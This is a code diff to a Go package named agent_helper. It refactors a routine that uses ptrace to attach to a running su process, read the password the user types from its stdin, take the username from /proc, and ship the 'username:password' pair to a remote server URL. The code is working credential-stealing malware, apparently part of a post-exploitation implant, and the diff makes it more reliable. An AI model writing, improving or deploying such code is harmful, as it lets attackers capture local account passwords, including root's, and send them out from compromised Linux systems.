@@ -1,6 +1,9 @@
+//go:build linux
+
 package agent_helper
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"runtime"
@@ -8,71 +11,84 @@ import (
 	"syscall"
 )
 
-func traceSUProcess(serverUrl string, taskData map[string]interface{}, pid int) {
+func traceSUProcess(ctx context.Context, serverUrl string, taskData map[string]interface{}, pid int) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
-	err := syscall.PtraceAttach(pid)
-	if err != nil {
+
+	if err := syscall.PtraceAttach(pid); err != nil {
 		return
 	}
-	defer func() {
-		syscall.PtraceDetach(pid)
-	}()
+	defer syscall.PtraceDetach(pid)
+
 	var wstatus syscall.WaitStatus
-	var readSyscallCount int
+	var inSyscall bool
+
 	for {
+		if ctx.Err() != nil {
+			return
+		}
 
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
 			return
 		}
-
+		if ctx.Err() != nil {
+			return
+		}
 		if wstatus.Exited() {
 			return
 		}
 
-		var regs syscall.PtraceRegs
-		err = syscall.PtraceGetRegs(pid, &regs)
-		if err != nil {
-			syscall.PtraceDetach(pid)
-			return
-		}
-		if regs.Orig_rax == 0 && regs.Rdi == 0 {
-			readSyscallCount++
-			if readSyscallCount == 3 {
-				buffer := make([]byte, regs.Rdx)
-				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
-				if err != nil {
-					return
-				}
-				if strings.Contains(string(buffer), "\n") {
-					cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-					if err != nil {
-						return
+		if wstatus.StopSignal() == syscall.SIGTRAP {
+			inSyscall = !inSyscall
+
+			var regs syscall.PtraceRegs
+			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
+				return
+			}
+
+			// Capture read-from-stdin on syscall exit when the buffer has been filled
+			if regs.Orig_rax == 0 && regs.Rdi == 0 && !inSyscall {
+				bytesRead := int(regs.Rax)
+				if bytesRead > 0 && bytesRead < 250 {
+					buffer := make([]byte, bytesRead)
+					if _, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer); err != nil {
+						syscall.PtraceSyscall(pid, 0)
+						continue
 					}
-					username := "root"
-					if len(cmdline) > 3 {
-						parts := strings.Split(string(cmdline), "\x00")
-						if len(parts) > 1 {
-							username = parts[1]
-						} else {
-							username = strings.TrimRight(string(cmdline[3:]), "\x00")
+
+					if strings.Contains(string(buffer), "\n") {
+						password := strings.Split(string(buffer), "\n")[0]
+						password = RemoveNonPrintableAscii(password)
+						if IsValidPassword(password) {
+							username := extractSUUsername(pid)
+							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 						}
-						username = RemoveNonPrintableAscii(username)
-					}
-					password := strings.Split(string(buffer), "\n")[0]
-					password = RemoveNonPrintableAscii(password)
-					if IsValidPassword(password) {
-						// here is your exfil spot
-						// go exfilPassword(username, password)
-						go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 					}
 				}
 			}
 		}
-		err = syscall.PtraceSyscall(pid, 0)
-		if err != nil {
+
+		if err := syscall.PtraceSyscall(pid, 0); err != nil {
 			return
 		}
 	}
+}
+
+func extractSUUsername(pid int) string {
+	username := "root"
+	cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+	if err != nil {
+		return username
+	}
+	if len(cmdline) > 3 {
+		parts := strings.Split(string(cmdline), "\x00")
+		if len(parts) > 1 && len(parts[1]) > 0 {
+			username = parts[1]
+		} else {
+			username = strings.TrimRight(string(cmdline[3:]), "\x00")
+		}
+		username = RemoveNonPrintableAscii(username)
+	}
+	return username
 }
